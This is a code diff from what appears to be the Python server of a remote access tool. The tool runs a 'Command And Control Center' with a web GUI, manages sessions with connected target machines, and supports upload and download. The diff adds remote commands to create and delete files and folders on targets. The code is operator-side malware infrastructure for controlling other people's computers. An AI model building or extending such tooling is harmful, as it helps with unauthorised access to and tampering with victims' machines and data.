@@ -196,6 +196,18 @@ def solo_command(session_num, command):
 				elif command[:2] == 'ls':
 						result = reliable_recv(target).split(',')
 						output_catalog_to_html(result)
+				elif command[:12] == 'create_file ':
+						result = reliable_recv(target).split(',')
+						output_catalog_to_html(result)
+				elif command[:12] == 'delete_file ':
+						result = reliable_recv(target).split(',')
+						output_catalog_to_html(result)
+				elif command[:14] == 'create_folder ':
+						result = reliable_recv(target).split(',')
+						output_catalog_to_html(result)
+				elif command[:14] == 'delete_folder ':
+						result = reliable_recv(target).split(',')
+						output_catalog_to_html(result)
 				elif command[:7] == 'upload ':
 						upload_file(target, command[7:])
 				elif command[:9] == 'download ':
@@ -269,9 +281,9 @@ print('[+] Waiting For The Incoming Connections')
 output_to_html('[+] Waiting For The Incoming Connections')
 
 @eel.expose
-def common_command(command):	
-#while True:
-		#command = input('[**] Command And Control Center: ')
+def common_command(command):
+		global targets
+		global stop_flag
 		# Список удаленных компьютеров
 		if command == 'targets':
 				counter = 0
